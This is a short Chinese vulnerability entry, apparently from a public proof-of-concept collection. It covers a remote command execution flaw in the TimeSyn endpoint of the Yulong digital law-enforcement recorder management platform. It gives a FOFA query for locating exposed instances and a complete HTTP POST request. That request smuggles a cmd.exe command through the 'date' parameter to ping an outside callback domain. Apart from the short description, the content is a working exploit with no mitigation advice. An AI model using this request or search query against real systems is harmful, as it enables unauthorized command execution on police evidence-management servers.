# 誉龙数字执法记录仪管理平台 TimeSyn 远程命令执行

# 一、漏洞简介
誉龙数字执法记录仪管理平台是深圳誉龙数字技术有限公司开发的执法记录仪管理平台，该平台存在远程命令执行漏洞，攻击者可以利用该漏洞执行任意命令，这可能导致对系统进行未经授权的操作，例如创建、修改或删除文件、执行系统命令、安装恶意软件等。

# 二、影响版本
+ 誉龙数字执法记录仪管理平台

# 三、资产测绘
+ fofa`body="PView 视音频管理平台"`
+ 特征


# 四、漏洞复现
```go
POST /index.php?r=Third/TimeSyn HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Host: 
Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 96

cloudKey=0x0&date=|cmd.exe+/c+ping jzogguorui.dgrh3.cn&time=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tory9ats6o7dd65g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
